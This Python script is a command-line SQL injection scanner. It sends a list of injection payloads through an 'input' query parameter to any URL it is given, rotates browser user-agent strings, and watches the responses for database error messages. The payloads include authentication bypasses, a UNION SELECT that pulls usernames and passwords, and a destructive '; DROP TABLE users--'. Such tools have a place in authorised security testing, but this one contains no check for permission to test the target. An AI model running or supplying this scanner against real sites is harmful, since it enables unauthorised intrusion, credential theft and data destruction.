import requests
import sys
import urllib.parse
import time
import argparse
import logging
import json
from random import choice

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# List of common SQL injection payloads
SQL_PAYLOADS = [
    "' OR 1=1--", "' OR '1'='1", "' OR ''='", "' OR 1=1-- -", "'; DROP TABLE users--",
    "' OR 1=1#", "' OR 1=1/*", "' OR 1=1 LIMIT 1 --", "' UNION SELECT null, null--",
    "' UNION SELECT username, password FROM users--", "admin'--", "admin' #",
    "admin'/*", "' OR 1=2", "' OR 'a'='a", "' OR '1'='1' --", "' OR 'x'='x"
]

# Common SQL error messages
SQL_ERRORS = [
    "SQL syntax", "MySQL", "SQLServer", "PostgreSQL", "Oracle", "database error",
    "you have an error in your SQL syntax", "Warning: mysql_fetch", "Unclosed quotation mark",
    "quoted string not properly terminated"
]

# Random User-Agent strings
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

def test_sql_injection(url, timeout=5, delay=0.5, verbose=False):
    headers = {
        'User-Agent': choice(USER_AGENTS),
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    vulnerable_payloads = []

    for payload in SQL_PAYLOADS:
        injected_url = urllib.parse.urljoin(url, f"?input={urllib.parse.quote(payload)}")

        logging.info(f"Testing payload: {payload}")
        try:
            response = requests.get(injected_url, headers=headers, timeout=timeout)

            if verbose:
                logging.debug(f"Response: {response.text}")

            for error in SQL_ERRORS:
                if error.lower() in response.text.lower():
                    logging.warning(f"Vulnerable to SQL injection with payload: {payload}")
                    vulnerable_payloads.append(payload)

                    user_input = input("Continue testing? (y/n): ").strip().lower()
                    if user_input != 'y':
                        logging.info("Stopping the test.")
                        return

                    break

        except requests.exceptions.Timeout:
            logging.error(f"Request to {injected_url} timed out.")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error occurred while testing {injected_url}: {str(e)}")

        time.sleep(delay)

    if vulnerable_payloads:
        logging.warning("Vulnerable payloads detected:")
        for payload in vulnerable_payloads:
            logging.warning(f"  - {payload}")
    else:
        logging.info("No vulnerabilities detected.")

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Tester")
    parser.add_argument("url", help="The URL to test for SQL injection")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Request timeout in seconds")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="Delay between requests in seconds")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    test_sql_injection(args.url, args.timeout, args.delay, args.verbose)

if __name__ == "__main__":
    main()